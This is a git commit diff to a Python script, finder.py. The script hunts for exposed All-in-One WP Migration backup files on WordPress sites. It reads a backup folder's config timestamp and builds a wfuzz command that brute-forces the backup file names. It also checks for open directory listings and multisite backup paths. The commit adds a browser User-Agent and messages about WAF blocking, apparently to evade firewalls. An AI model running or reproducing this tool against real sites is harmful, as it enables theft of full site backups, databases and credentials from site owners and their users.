9c4b96a71fb8abaee7aaaab7c8d91a6d387af572
Robbie <txt3rob@gmail.com>
2020-08-28 13:32:42 +0100

    Update finder.py
    Added better error handling on initial check for file.
    Added new method to cut down bruteforce if detected.

--- finder.py
+++ finder.py
@@ -20,6 +20,7 @@ import argparse
 from urllib.parse import urlparse
 import sys
 import os
+from bs4 import BeautifulSoup
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
@@ -30,6 +31,8 @@ parser.add_argument("-u", "--url", required=True, help="Wordpress Url")
 args = parser.parse_args()
 url = args.url
 
+headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0","Connection":"close","Accept":"*/*"}
+response = session.get(""+url+"/wp-content/ai1wm-backups/web.config", headers=headers,verify=False)
 
 def vercheck (url,headers):
 	vercheck = session.get(""+url+"/wp-content/plugins/all-in-one-wp-migration/readme.txt", headers=headers,verify=False)
@@ -43,6 +46,16 @@ def lazycheck(url,headers):
 		print ("[*] Do not need to bruteforce as the backup folder has directory listings enabled.[*] ")
 		print ("[*] Please Browse to "+url+"/wp-content/ai1wm-backups/ to see exposed directory [*] ")
 		sys.exit(0)
+		
+def multicheck(url,headers):
+	domain = urlparse(url).netloc
+	multicheck = session.get(""+url+"/wp-content/ai1wm-backups/"+domain+"", headers=headers,verify=False)
+	if multicheck.status_code == 300:
+		soup = BeautifulSoup(multicheck.text, "html.parser")
+		print ("[*] Following Backups have been found [*] ")
+		for link in soup.findAll('a'):
+			print(link.get('href'))
+			sys.exit(0)
 
 def wayback(domain,headers):
 	wayback = session.get("http://web.archive.org/cdx/search/cdx?url="+url+"*&output=txt&fl=original&collapse=urlkey", headers=headers,verify=False)
@@ -55,37 +68,48 @@ def wayback(domain,headers):
 
 
 
-headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*"}
-response = session.get(""+url+"/wp-content/ai1wm-backups/web.config", headers=headers,verify=False)
 
 
 
 
-if response.status_code == 200:
-	if ".wpress" in response.text:
-		last_modified = response.headers['last-modified']
-		timestamp = datetime.strptime(last_modified,"%a, %d %b %Y %H:%M:%S %Z")
-		time_ymd = timestamp.strftime("%Y%m%d")
-		time_hms = timestamp.strftime("%H")
-		r = session.get(""+url+"", headers=headers,verify=False)
-		domain = urlparse(r.url).netloc
-		print ("Checking Wayback Urls")
-		wayback(domain,headers)
-		print ("Checking Exposed Backup Dir")
-		lazycheck(url,headers)
-		print ("Checking Plugin Version")
-		vercheck (url,headers)
-		print ("[*] Terminate WFuzz if you are not seeing 404 or 200 responses as this means error or rate limited. [*] ")
-		try:
-			command = ("wfuzz --oF /tmp/session --field r -c -z range,0-55 -z range,0-59 -z range,100-999 -X HEAD --sc 200 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-"+time_hms+"FUZZFUZ2Z-FUZ3Z.wpress")
-			print ("[*] Wfuzz using the following command: "+command+" [*]")
-			os.system(command)
-		except KeyboardInterrupt:
-			print ("Ctrl-c pressed ...")
-			sys.exit(1)
+print(response.status_code)
+try:
+	if response.status_code == 200:
+		if ".wpress" in response.text:
+			last_modified = response.headers['last-modified']
+			timestamp = datetime.strptime(last_modified,"%a, %d %b %Y %H:%M:%S %Z")
+			time_ymd = timestamp.strftime("%Y%m%d")
+			time_hms = timestamp.strftime("%H")
+			r = session.get(""+url+"", headers=headers,verify=False)
+			domain = urlparse(r.url).netloc
+			print ("Checking Wayback Urls")
+			wayback(domain,headers)
+			print ("Checking Exposed Backup Dir")
+			lazycheck(url,headers)
+			multicheck(url,headers)
+			print ("Checking Plugin Version")
+			vercheck (url,headers)
+			print ("[*] Terminate WFuzz if you are not seeing 404 or 200 responses as this means error or rate limited. [*] ")
+			try:
+				command = ("wfuzz --oF /tmp/session --field r -c -z range,0-55 -z range,0-59 -z range,100-999 -X HEAD --sc 200 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-"+time_hms+"FUZZFUZ2Z-FUZ3Z.wpress")
+				print ("[*] Wfuzz using the following command: "+command+" [*]")
+				os.system(command)
+			except KeyboardInterrupt:
+				print ("Ctrl-c pressed ...")
+				sys.exit(1)
 				
-		except Exception as e:
-			print('Error: %s' % e)
-			sys.exit(1)
-else:
-	print ("[*] Sorry not able to find the file required to start the tests [*] ")
+			except Exception as e:
+				print('Error: %s' % e)
+				sys.exit(1)
+		else:
+			print("[*] Unable to grab config file. [*]")
+			print("[*] Got the Following Response. [*]")
+			print(response.text)
+
+	if response.status_code == 403:
+		print("[*] WAF Blocking Got 403 [*]")
+	if response.status_code == 401:
+		print("[*] WAF Blocking Got 401 [*]")
+
+except Exception as e:
+		print('Error: %s' % e)
